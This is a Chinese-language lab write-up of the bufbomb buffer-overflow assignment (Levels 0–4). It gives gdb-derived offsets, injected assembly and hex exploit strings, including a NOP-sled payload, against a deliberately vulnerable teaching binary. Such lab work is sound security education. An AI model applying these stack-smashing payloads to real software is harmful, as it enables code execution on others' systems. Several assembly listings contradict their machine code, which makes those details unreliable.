# 缓冲区溢出漏洞

---

 ## Level 0: Candle

首先我们需要反汇编我们的`./bufbomb`代码

```
$ objdump -d ./bin/bufbomb > bufbomb.s
```

上述代码不能跨平台运行，因此我们提供`docker`环境运行，直接在目录中输入

```
$ make dump
```

即可在当前的dump目录中得到`bufbomb.s`文件

Level 0的要求是将函数`getbuf`的返回地址重定向到函数`smoke`中，由于题目中缓冲区开始的地址为`-0x24(%ebp)`，而返回地址开始的地方为`0x4(%ebp)`，因此需要写入`48bytes`的数据，其中最后`4bytes`为`smoke`函数的地址。

在我们生成的文件中，`smoke`函数的地址为`0x08048b6b`，因此输入文件`raw/exploit0.txt`如下所示

```
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 6b 8b 04 08
```

如果在`ubuntu`下，执行下述脚本即可完成任务

```
$ cat ./raw/exploit0.txt | ./bin/hex2raw | ./bin/bufbomb -u 2015011310
```

其他系统（如Mac OS）下，安装docker之后，直接执行

```
$ make ex0
```

即可获取结果，结果如下

```
Userid: 2015011310
Cookie: 0x2eca4965
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```



## Level 1: Sparkler

本题需要传入参数，并把返回地址重定向到`fizz`函数中，在Level 0中生成的bufbomb.s中找到`fizz`函数的地址为`0x08048b98`，当`getbuf`返回的时候，会返回到`fizz`函数处，此时`%esp`位于缓冲区起始点+48处。进入`fizz`函数之后的

```assembly
push %ebp
movl %esp %ebp
```

操作又会压栈一次，使得`%esp`的位置位于缓冲区起始点+44处，因此，由于函数`fizz`的第一个参数的地址为`8(%esp)`，于是，第一个参数的地址在缓冲区起始点+52处，我们利用下述代码可以根据学号生成cookie

```
$ ./bin/makecookie 2015011310
0x2eca4965
```

或者利用docker，运行

```
$ make cookie ID=2015011310
docker run --privileged -i --rm --name buflab-container buflab ./bin/makecookie 2015011310
0x2eca4965
```

我们获得的cookie为`0x2eca4965`，于是可以得到下述`raw/exploit1.txt`

```
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 98 8b 04 08
90 90 90 90 65 49 ca 2e
```

如果在`ubuntu`下，执行下述脚本即可完成任务

```
$ cat ./raw/exploit1.txt | ./bin/hex2raw | ./bin/bufbomb -u 2015011310
```

其他系统（如Mac OS）下，安装docker之后，直接执行

```
$ make ex1
```

最终可以得到如下结果

```
Userid: 2015011310
Cookie: 0x2eca4965
Type string:Fizz!: You called fizz(0x2eca4965)
VALID
NICE JOB!
```



## Level 2: Firecracker

本题需要设置一个全局变量的值为cookie，因此需要在缓冲区溢出的代码中插入自己的机器码，因此需要书写汇编程序修改全局变量`global_value`的值并汇编成机器码写入，再将`getbuf`函数的返回地址跳入自己插入的代码中，之后在这段代码的最后跳入`bang`函数中即可。

查看`./dump/bufbomb.s`中的`bang`函数处的代码

```assembly
08048be9 <bang>:
 8048be9:	55                   	push   %ebp
 8048bea:	89 e5                	mov    %esp,%ebp
 8048bec:	83 ec 08             	sub    $0x8,%esp
 8048bef:	a1 40 e1 04 08       	mov    0x804e140,%eax
 8048bf4:	89 c2                	mov    %eax,%edx
 8048bf6:	a1 38 e1 04 08       	mov    0x804e138,%eax
 8048bfb:	39 c2                	cmp    %eax,%edx
 8048bfd:	75 25                	jne    8048c24 <bang+0x3b>
 8048bff:	a1 40 e1 04 08       	mov    0x804e140,%eax
 8048c04:	83 ec 08             	sub    $0x8,%esp
 ......
```

对照`bang`函数的C代码

```C
int global_value = 0;
void bang(int val)
{
    if (global_value == cookie) {
        printf("Bang!: You set global_value to 0x%x\n", global_value); validate(2);
    } else
        printf("Misfire: global_value = 0x%x\n", global_value);
    exit(0); 
}
```

可以得知全局变量`global_value`的存储地址为`0x0804e140`，`bang`函数的地址为`0x08048be9`

下面是设置gloal_value值为cookie的汇编代码为:

```assembly
mov 0x2eca4965, 0x0804e140  /* set global_value as cookie */
push $0x08048be9      		/* push the address of bang to the stack */
ret        	      			/* goto bang */
```

此代码在`./bomb/ex2.s`中可以找到。

如果是Linux系统，可以直接开始下述实验，但是其他系统，则可以用docker模拟轻量级的ubuntu环境，安装docker之后直接在当前目录运行`make`，可以进入ubuntu环境如下

```
$ make
...
root@ffa841b5bba0:/usr/src/app#
```

可以在此虚拟环境下做更多的操作。

利用`gcc`编译出`.o`文件，然后用`objdump`得到机器码

```
root@ffa841b5bba0:/usr/src/app# gcc -m32 -c bomb/ex2.S
root@ffa841b5bba0:/usr/src/app# objdump -d ex2.o

ex2.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   c7 05 40 e1 04 08 65    movl   $0x2eca4965,0x804e140
   7:   49 ca 2e
   a:   68 e9 8b 04 08          push   $0x8048be9
   f:   c3                      ret

```

将上述机器码用小端法写入，同时，利用gdb调试可以得到当前`%esp`的地址

```
root@ffa841b5bba0:/usr/src/app# gdb bin/bufbomb
>>> b getbuf
>>> r -u 2015011310
>>> p /x $esp
$2 = 0x55683e78
```

于是我们可以知道缓冲区开始的地址为`0x55683e78`，于是可得到`./raw/exploit2.txt`

```
c7 05 40 e1 04 08 65 49 ca 2e 68 e9 8b 04 08 c3
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 78 3e 68 55
```

执行`make ex2`或者在Linux下执行`cat ./raw/exploit2.txt | ./bin/hex2raw | ./bin/bufbomb -u 2015011310`可以得到结果

```
Userid: 2015011310
Cookie: 0x2eca4965
Type string:Bang!: You set global_value to 0x2eca4965
VALID
NICE JOB!
```



## Level 3: Dynamite

本题需要我们修改`getbuf`函数的返回值为cookie，并让函数正常返回到调用者`test`。

为了达成上面的目标，我们必须保证`%esp`中的old `%ebp`值不能被冲掉。

首先我们从`./dump/bufbomb.s`中找到`test`函数中，`getbuf`的返回地址为`0x08048c57`，如下：

```assembly
08048c44 <test>:
 8048c44:	55                   	push   %ebp
 8048c45:	89 e5                	mov    %esp,%ebp
 8048c47:	83 ec 18             	sub    $0x18,%esp
 8048c4a:	e8 81 04 00 00       	call   80490d0 <uniqueval>
 8048c4f:	89 45 f0             	mov    %eax,-0x10(%ebp)
 8048c52:	e8 67 00 00 00       	call   8048cbe <getbuf>
 8048c57:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048c5a:	e8 71 04 00 00       	call   80490d0 <uniqueval>
```

然后需要用gdb确定old `%ebp`的值

```
root@ffa841b5bba0:/usr/src/app# gdb bin/bufbomb
>>> b getbuf
>>> r -u 2015011310
>>> p /x *((unsigned*)$ebp)
$1 = 0x55683ec0
```

于是我们在缓冲区开始地址+40处填上` 0x55683ec0`即可使得`%ebp`不被冲掉。

之后我们书写`./bomb/ex3.S`赋值使得返回地址为cookie:

```assembly
movl $0x2eca4965, %eax  /* set return value as cookie */
pushl $0x08048c44      	/* push the address of test to the stack */
ret        	            /* go back to test */
```

获得机器码

```
root@6327d7bb40ab:/usr/src/app# gcc -c -m32 bomb/ex3.S
root@6327d7bb40ab:/usr/src/app# objdump -d ex3.o

ex3.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   b8 65 49 ca 2e          mov    $0x2eca4965,%eax
   5:   68 57 8c 04 08          push   $0x8048c44
   a:   c3                      ret

```

于是可以得到`./raw/exploit3.txt`

```
b8 65 49 ca 2e 68 57 8c 04 08 c3 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 c0 3e 68 55 78 3e 68 55
```



## Level 4: Nitroglycerin

本题中，`getbufn`中栈的位置会变化，因此需要找到正确的`%ebp`的位置。在`testn`函数中，可以看到一行`subl $0x18, %esp`，因此我们可以得知，`%ebp`的位置应该为`0x18(%esp)`，于是在上一题的基础上，可以得到下述`./bomb/ex4.S`代码，注意此时`getbufn`在`testn`中的返回地址为`0x08048d0e`

```assembly
leal 0x18(%esp), %ebp	/* set the correct %ebp address */
movl $0x2eca4965, %eax  /* set return value as cookie */
pushl $0x08048d0e      	/* push the address of test to the stack */
ret        	            /* go back to test */
```

于是可以获得机器码

```
root@9907ec595452:/usr/src/app# gcc -m32 -c bomb/ex4.S
root@9907ec595452:/usr/src/app# objdump -d ex4.o

ex4.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   8d 6c 24 18             lea    0x18(%esp),%ebp
   4:   b8 65 49 ca 2e          mov    $0x2eca4965,%eax
   9:   68 0e 8d 04 08          push   $0x8048c57
   e:   c3                      ret

```

另外由gdb可以获取`%ebp`的地址为`0x55683ea0`，由于栈的位置会变化，而缓冲区大小为512bytes，我们只需选择大概离`%ebp`距离为缓冲区大小一半的位置即可，因此我们选择的返回地址为`0x55683ea0 - 0x100 = 0x55683da0`

因此`./raw/exploit4.txt`文件应该为

```
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24
18 b8 65 49 ca 2e 68 0e 8d 04 08 c3 a0 3d 68 55
```

运行`make ex4`可以在docker下看到结果，或者在Linux下运行`cat ./raw/exploit4.txt | ./bin/hex2raw -n | ./bin/bufbomb -n -u 2015011310`，结果如下

```
Userid: 2015011310
Cookie: 0x2eca4965
Type string:KABOOM!: getbufn returned 0x2eca4965
Keep going
Type string:KABOOM!: getbufn returned 0x2eca4965
Keep going
Type string:KABOOM!: getbufn returned 0x2eca4965
Keep going
Type string:KABOOM!: getbufn returned 0x2eca4965
Keep going
Type string:KABOOM!: getbufn returned 0x2eca4965
VALID
NICE JOB!
```

